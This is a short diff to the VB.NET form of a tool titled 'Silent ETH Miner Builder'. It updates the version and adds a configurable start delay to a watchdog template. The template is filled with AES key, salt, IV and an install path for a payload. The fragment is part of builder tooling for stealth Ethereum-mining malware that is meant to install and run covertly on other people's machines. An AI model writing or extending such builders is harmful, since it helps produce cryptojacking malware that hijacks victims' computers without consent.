@@ -20,7 +20,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent ETH Miner Builder 1.0.2"
+            MephForm1.Text = "Silent ETH Miner Builder 1.1"
         Catch ex As Exception
         End Try
 
@@ -128,6 +128,7 @@ Public Class Form1
                     watchdogbuilder.Replace("#KEY", AESKEY)
                     watchdogbuilder.Replace("#SALT", SALT)
                     watchdogbuilder.Replace("#IV", IV)
+                    watchdogbuilder.Replace("#STARTDELAY", txtStartDelay.Text)
                     watchdogbuilder.Replace("PayloadPath", "System.IO.Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
 
                     WatchdogSource = watchdogbuilder.ToString()
